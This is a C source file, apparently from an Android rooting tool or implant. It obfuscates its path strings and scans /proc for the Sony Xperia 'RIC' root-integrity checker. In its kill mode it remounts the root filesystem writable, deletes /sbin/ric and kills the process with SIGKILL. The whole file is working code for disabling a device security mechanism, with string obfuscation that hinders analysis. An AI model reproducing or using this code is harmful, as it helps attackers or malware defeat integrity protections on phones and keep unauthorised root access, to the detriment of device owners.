#include <sys/mount.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
#include "deobfuscate.h"
#include "utils.h"
#include "log.h"

static unsigned char ric_path[] = "\x58\xc4\x95\xff\x2b\x3a\x31\x3e\xff\x2a\x31\x3b"; // "/sbin/ric"
static unsigned char proc_cmd[] = "\x5b\x9d\xd6\x8c\x55\x5b\x4c\x48\x8c\x86\x58\x8c\x48\x4e\x41\x49\x52\x4f\x46"; // "/proc/%s/cmdline"
static unsigned char proc[] = "\x86\x7d\xfe\x5b\x0e\x0c\x1b\x1f"; // "/proc"
static unsigned char system_str[] = "\x30\xba\x8d\x63\x47\xb9\x47\x44\xb5\xad"; // "/system"
static unsigned char root_p[] = "\x79\x23\x5b\x5a"; // "/"

#define R_CHECK 0
#define R_KILL  1

static int do_on_ric(int action) {
  DIR *dp;
  struct dirent *ep;
  char str[256];
  char out[256];
  FILE *f;
  struct stat st1;
  int pid;
  int ret = 0;

  dp = opendir(deobfuscate(proc));
  if (dp != NULL) {
    while (ep = readdir (dp)) {
      snprintf(str, sizeof(str), deobfuscate(proc_cmd), ep->d_name);
      if(stat(str, &st1) < 0) continue;
      // Check the process name
      f = fopen(str, "r");
      if(f != NULL) {
	// Look for ric PIDs
	fread(out, 1, sizeof(out), f);
	if(strcasestr(out, deobfuscate(ric_path)) != NULL) {
	  pid = strtoul(ep->d_name, NULL, 10);
	  if(action == R_CHECK) {
	    LOGD("[RIC MANAGER] Xperia RIC presents: %d!\n", pid);
	    ret = pid;
	  }
	  else if(action == R_KILL) {
	    LOGD("[RIC MANAGER] Killing RIC: %d!\n", pid);
	    // Delete ric binary
	    remount(deobfuscate(root_p), 0);
	    remove(deobfuscate(ric_path));
	    remount(deobfuscate(root_p), MS_RDONLY);
	    // Stop it
	    kill(pid, SIGKILL);
	    ret = 1;
	  }
	}
      }
    }
    
    closedir(dp);
  }

  return ret;
}



int is_ric_present(void) {
  return do_on_ric(R_CHECK);
}

int remove_ric(void) {
  return do_on_ric(R_KILL);
}
